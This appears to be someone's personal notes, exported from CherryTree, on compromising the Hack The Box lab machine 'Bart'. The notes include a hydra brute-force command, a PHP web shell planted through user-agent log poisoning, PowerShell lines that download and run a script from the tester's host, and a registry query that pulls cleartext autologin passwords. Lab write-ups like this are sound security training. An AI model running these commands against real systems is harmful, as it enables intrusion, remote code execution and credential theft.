<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.81 Bart</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.81 Bart</h1><br/>nmap showed only port 80 open.<br />as things showd up at added them to the /etc/hosts file<br />dirsearch showed me monitor, which forwarded me to monitor.bart.htb (added to hosts)<br />I needed a password so I was able to take the userlist that I created in the last step by looking at the website<br />I used cewl on the main page to create a password list from forum.bart.htb<br />csrf is being used on the webpage so I cheated and found the login was harvey potter<br />monitor.bart.htb showed me internal-01.bart.htb (added to hosts)<br />I was able to use tirefire&#39;s hydra and rockyou to get the username harvey and the password Password1 <br />!!!!!!!!!!!<br />much fuckery needed to be done to the end of the command becasue the error message would change depending on how long the password was<br />!!!!!!!!!!!<br />hydra -l harvey -P /root/Desktop/Tools/Wordlists/rockyou.txt internal-01.bart.htb http-post-form &#39;/simple_chat/login.php:uname=^USER^&amp;passwd=^PASS^&amp;submit=Login:Password&#39;<br />!!!!!!!!!!!<br />in the page source code I saw this directory was displayed<br /><a href="http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey">http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey</a><br />when i turn log.php into log.txt I can see that my useragent is being logged to this page<br />...smells like log poisoning!!!<br />replaced the user agent string with this bad boy...(in burp obviously)<br />    &lt;?php system($_REQUEST[&#39;YeetCannon&#39;]); ?&gt;<br />    and it took!<br />now to get some commandage<br /><a href="http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey&YeetCannon=whoami">http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey&amp;YeetCannon=whoami</a><br />responce!!<br />now lets get a shell<br /><a href="http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey&YeetCannon=powershell">http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey&amp;YeetCannon=powershell</a> -exec bypass &quot;iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.60:8000/ye3233.ps1&#39;)<br />SHELLLYYYYYYY<br />too bad It is a service account<br /><br />very first SA command<br />PS C:\inetpub\wwwroot\internal-01\log&gt;[environment]::Is64BitProcess<br />False<br />...Fuck<br />letst fix it by calling the sysnative powershell<br /><a href="http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey&YeetCannon=powershell">http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey&amp;YeetCannon=</a>C:\windows\sysnative\windowspowershell\v1.0\powershell.exe -exec bypass “iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.60:8000/ye3233.ps1&#39;)”<br />PS C:\inetpub\wwwroot\internal-01\log&gt;[environment]::Is64BitProcess<br />True<br />phewwwwwwwwwww<br /><br />a reg query showed me that there was a cleartext password being stored for autologin<br />reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; | findstr /isp &quot;password&quot; <br /><br />lets use these creds to conect to the local C$<br />net use x: \\localhost\c$ /user:administrator 3130438f31186fbaf962f407711faddb<br />x:<br />type users\administrator\desktop\root.txt<br />yeeeeee<br />type user\h.potter\user.txt<br />yeeeheee<br /></div></body></html>